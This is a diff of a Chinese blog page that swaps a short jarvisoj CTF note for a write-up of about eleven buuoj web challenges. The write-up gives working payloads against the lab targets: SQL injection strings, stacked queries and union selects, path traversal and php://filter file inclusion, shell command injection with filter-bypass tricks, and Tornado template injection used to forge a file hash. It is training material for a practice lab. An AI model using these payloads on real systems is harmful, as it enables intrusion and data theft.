@@ -6,19 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://xyel.ml">
-  <title>[jarvisojCTF]localhost | xyel的Hexo小站</title>
+  <title>[buuoj]Web | xyel的Hexo小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="[jarvisojCTF]localhost靶场地址：http:&#x2F;&#x2F;web.jarvisoj.com:32774&#x2F;  localhost access only!!">
+  <meta name="description" content="buuoj上的Web题目Url: https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[jarvisojCTF]localhost">
-<meta property="og:url" content="https://xyel.ml/jarvisojCTF-localhost.html">
+<meta property="og:title" content="[buuoj]Web">
+<meta property="og:url" content="https://xyel.ml/buuoj-Web.html">
 <meta property="og:site_name" content="xyel的Hexo小站">
-<meta property="og:description" content="[jarvisojCTF]localhost靶场地址：http:&#x2F;&#x2F;web.jarvisoj.com:32774&#x2F;  localhost access only!!">
+<meta property="og:description" content="buuoj上的Web题目Url: https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-09-11T14:43:36.000Z">
-<meta property="article:modified_time" content="2020-10-19T13:19:59.374Z">
+<meta property="article:published_time" content="2020-12-09T11:14:13.000Z">
+<meta property="article:modified_time" content="2020-12-13T12:46:19.457Z">
 <meta property="article:author" content="xyel">
-<meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
   
@@ -150,42 +149,201 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-jarvisojCTF-localhost" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-buuoj-Web" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      [jarvisojCTF]localhost
+      [buuoj]Web
     </h1>
   
 
         
-        <a href="/jarvisojCTF-localhost.html" class="archive-article-date">
-  	<time datetime="2020-09-11T14:43:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-11</time>
+        <a href="/buuoj-Web.html" class="archive-article-date">
+  	<time datetime="2020-12-09T11:14:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="jarvisojCTF-localhost"><a href="#jarvisojCTF-localhost" class="headerlink" title="[jarvisojCTF]localhost"></a>[jarvisojCTF]localhost</h1><p>靶场地址：<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32774/">http://web.jarvisoj.com:32774/</a></p>
-<blockquote>
-<h3 id="localhost-access-only"><a href="#localhost-access-only" class="headerlink" title="localhost access only!!"></a>localhost access only!!</h3></blockquote>
-<a id="more"></a>
+        <h1 id="buuoj上的Web题目"><a href="#buuoj上的Web题目" class="headerlink" title="buuoj上的Web题目"></a>buuoj上的Web题目</h1><h2 id="Url-https-buuoj-cn-challenges"><a href="#Url-https-buuoj-cn-challenges" class="headerlink" title="Url: https://buuoj.cn/challenges"></a>Url: <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></h2><a id="more"></a>
 
-<p>第一反应</p>
-<p>没有第一反应  就是不会</p>
-<p>百度了一些资料没有思路</p>
-<p>于是只好去看别人的writeup了</p>
-<p><code>burp使用技巧</code></p>
+<h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>easySQL那么先sqlmap一把梭  结果<code>with --string=&quot;用 sqlmap 是没有灵魂的&quot;</code></p>
+<p>emmmmmm那还是灵魂一笔  万能密码</p>
+<p>Payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1#</span><br><span class="line">1&#39;||1#</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>Ｘ-Forward-For         127.0.0.1</p>
+<p>flag{eb2fcf12-f7d4-4062-b957-ec16e5308422}</p>
 </blockquote>
-<p>构造一个“原始客户端为localhost”的报文，达到access的目的</p>
+<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>首先很轻易的发现source.php和hint.php</p>
+<p>然后经过尝试在index.php后加上?file=source.php  成功跳转到source.php  这题考的应该是文件包含</p>
+<p>根据hint提示flag在ffffllllaaaagggg   想到un中出现过的../../../../../</p>
+<p>构造payload：</p>
 <blockquote>
-<p>Yeah!! Here’s your flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p>
+<p>index.php?file=source.php?../../../../../ffffllllaaaagggg </p>
+</blockquote>
+<blockquote>
+<p>flag{02a2117d-2852-47a4-92ad-80327478d03c}</p>
+</blockquote>
+<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>尝试手工  折腾了一圈被waf拦住</p>
+<blockquote>
+<p>waf: return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
+</blockquote>
+<p>盲目sqlmap一把梭再次失效</p>
+<p>想到了DozerCTF中sqli-lab 0 中关于union select 关键词等绕过的方法</p>
+<blockquote>
+<p>?inject=1%27;show%20databases;%2523      //库名</p>
+</blockquote>
+<blockquote>
+<p>?inject=1%27;use%20supersqli;show%20tables;%2523     //表名</p>
+</blockquote>
+<blockquote>
+<p><code>?inject=1%27;use%20supersqli;show%20columns%20from%20`1919810931114514`;%2523    //列名</code></p>
+</blockquote>
+<p>这里需要用反引号把数字括起来</p>
+<p>使用handler查询</p>
+<blockquote>
+<p><code>?inject=1%27;handler%20`1919810931114514`%20open%20as%20flag;handler%20flag%20read%20first;%2523</code></p>
+</blockquote>
+<blockquote>
+<p>flag{ba6e966a-d270-44bc-9456-da9a4ff309e3}</p>
+</blockquote>
+<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>翻源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<blockquote>
+<p>?cat=dog</p>
+</blockquote>
+<blockquote>
+<p>flag{f6aec042-3142-4359-b052-ebfa57ab5974}</p>
+</blockquote>
+<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>知道这个是堆叠注入  然后就不会了</p>
+<p>wp学习ing</p>
+<blockquote>
+<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能</p>
+</blockquote>
+<p>payload:</p>
+<blockquote>
+<p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p>
+</blockquote>
+<p>非预期解：</p>
+<blockquote>
+<p>*,1 </p>
+</blockquote>
+<blockquote>
+<p>flag{2f73655a-8d89-469b-b242-933dd6256dad}</p>
+</blockquote>
+<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>首先在首页找到./Archive_room.php</p>
+<p>然后抓包 在302包中抓到   secr3t.php  </p>
+<p>访问得到flag的地址  直接访问没有结果  考虑文件包含</p>
+<blockquote>
+<p>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</p>
+</blockquote>
+<blockquote>
+<p>flag{2e49de84-a567-48bb-910d-b9a2f383fedd}</p>
+</blockquote>
+<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>点击hint出现提示</p>
+<p>根据提示页面可以看到</p>
+<blockquote>
+<p>?file=flag.php</p>
+</blockquote>
+<p>非常明显的文件包含</p>
+<p>仍然用上面的filter</p>
+<blockquote>
+<p>flag{03945aba-54c2-45a5-a42f-0ab44b848ebb}</p>
+</blockquote>
+<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>首先使用万能密码登陆  得到username和password</p>
+<p>构造order by</p>
+<blockquote>
+<p>?username=admin’ order by 4%23&amp;password=1</p>
+</blockquote>
+<p>在字段位4的时候报错</p>
+<p>构造回显位</p>
+<blockquote>
+<p>?username=’ union select 1, 2 ,3 %23&amp;password=1</p>
+</blockquote>
+<blockquote>
+<p>Hello 2！Your password is ‘3’</p>
+</blockquote>
+<p>构造</p>
+<blockquote>
+<p>?username=’ union select 1, 2 , table_name from information_schema.tables where table_schema=database() limit 0,1%23&amp;password=1</p>
+</blockquote>
+<p>构造</p>
+<blockquote>
+<p>?username=’ union select 1, 2 , column_name from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’ limit 2,1%23&amp;password=1</p>
+</blockquote>
+<p>(0,1) geekuser  –&gt; id  username  password</p>
+<p>(1,1)l0ve1ysq1  –&gt; id  username  password</p>
+<p>翻阅得到flag</p>
+<blockquote>
+<p>?username=’ union select 1, 2 , password from l0ve1ysq1  limit 15,1%23&amp;password=1</p>
+</blockquote>
+<blockquote>
+<p>flag{7120c9eb-f6ac-4198-9772-af4d536035e1}</p>
+</blockquote>
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>一开始我以为这玩意是二次编码  于是摸出了下面这个东西</p>
+<blockquote>
+<p>?ip=1;cat%2520%252f%2566%256c%2561%2567.php</p>
+</blockquote>
+<p>摸完以后发现  各种报错终于消失了  然而什么也没有输出</p>
+<p>那肯定是方法错了  去参考别人的wp</p>
+<blockquote>
+<p>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>内联执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;cat$IFS$<span class="number">1</span>`ls`</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;a=g;cat$IFS$<span class="number">1</span>fla$a.php</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>根据以上自己看别人没写出来的拼接写了一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;a=f;c=a;b=l;d=g;cat$IFS$<span class="number">1</span>$a$b$c$d.php</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>NOTICE:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这个的意思为顺序出现flag就die  所以上面吧b=l和c=a换了个位置</p>
+</blockquote>
+<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>这我也不会  以下为wp</p>
+<blockquote>
+<p>题目是easy_tornado，/welcome.txt页面也看到render，可能会是SSTI模板注入</p>
+<p>传递error?msg=2，页面出现2<br>传递error?msg=6，页面出现ORZ（但并不是cookie）<br>尝试除和减操作符也是）返回ORZ，说明是操作符背过滤了。</p>
+<p>那么tornado中的cookie通过模板注入要怎么拿到呢？<br>用的就是handler.settings对象</p>
+<p><strong>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</strong></p>
+<p>传递error?msg=得到：</p>
+<p>{‘autoreload’: True, ‘compiled_template_cache’: False, ‘cookie_secret’: ‘93881405-8942-4355-9d77-09906cf0fcd6’}<br>这样就拿到cookie_secret了</p>
+<p>然后传递file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/fllllllllllllag))</p>
+</blockquote>
+<p>/fllllllllllllag–&gt; 3bf9f6cf685a6dd8defadabfb41a03a1</p>
+<p>cookie–&gt; 2adc5b30-c295-468e-9a36-680b9a92ac95</p>
+<blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">cookie_secret=<span class="string">&quot;2adc5b30-c295-468e-9a36-680b9a92ac95&quot;</span></span><br><span class="line">hash.update(filename.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">s1=hash.hexdigest()</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(hash.hexdigest())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>answer–&gt;68d0e68daab2822053279f352e1acd86</p>
+<p>payload:</p>
+<blockquote>
+<p>file?filename=/fllllllllllllag&amp;filehash=68d0e68daab2822053279f352e1acd86</p>
+</blockquote>
+<blockquote>
+<p>flag{7d51aff0-e03c-4251-9770-95bf12b3771d}</p>
+</blockquote>
+<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>常规命令执行   构造</p>
+<blockquote>
+<p>1;cat /flag</p>
+</blockquote>
+<blockquote>
+<p>flag{91340a55-ac33-404c-9bc7-4b8a38bf3c09}</p>
 </blockquote>
 
       
@@ -199,10 +357,6 @@
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
         		</li>
@@ -260,7 +414,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/jarvisojCTF-localhost.html" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/buuoj-Web.html" alt="微信分享二维码">
     </div>
 </div>
 
@@ -274,18 +428,9 @@
   
 <nav id="article-nav">
   
-    <a href="/61CTF-admin.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          [61CTF]admin
-        
-      </div>
-    </a>
   
-  
-    <a href="/Web%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8C%87%E5%8D%9704-SQL%E6%B3%A8%E5%85%A5.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Web安全防护指南04-SQL注入</div>
+    <a href="/UNCTF2020.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">UNCTF2020</div>
       <i class="icon-circle-right"></i>
     </a>
   
